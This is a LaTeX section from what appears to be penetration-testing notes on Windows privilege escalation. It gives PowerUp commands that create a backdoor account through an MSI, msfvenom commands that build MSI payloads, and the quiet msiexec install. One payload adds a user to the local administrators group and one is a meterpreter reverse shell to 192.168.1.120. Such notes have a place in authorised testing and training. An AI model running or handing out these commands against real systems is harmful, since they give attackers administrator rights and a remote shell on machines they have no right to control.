
\section{Misc.}

\subsection{PrintNightmare}
See~\ref{windows:printnightmare}

\subsection{Always install elevated}


\verb+reg query HKCU\Software\Policies\Microsoft\Windows\Installer+
\verb+reg query HKLM\Software\Policies\Microsoft\Windows\Installer+

it might be mecessary to check applocker policy
\begin{verbatim}
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
\end{verbatim}

\subsubsection{PowerUp}
\begin{verbatim}
Import-Module .\PowerUp.ps1
Write-UserAddMSI
runas /user:backdoor cmd
\end{verbatim}

\subsubsection{msfvenom}
\begin{verbatim}
msfvenom -p windows/exec CMD='net localgroup administrators raaz /add' -f msi > /root/Desktop/2.msi
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.120 lport=4567 -f msi > /root/Desktop/1.msi
msiexec /quiet /qn /i 2.msi
\end{verbatim}


\subsubsection{Metasploit}

il y a un module metasploit
\verb+exploit./windows/local/always_install_elevated+

or the solution to craft a payload with msfvenom




\verb+msiexec /i  c:\MSI_PATH /quiet /qn /norestart+

\subsection{Named pipe impersonation}





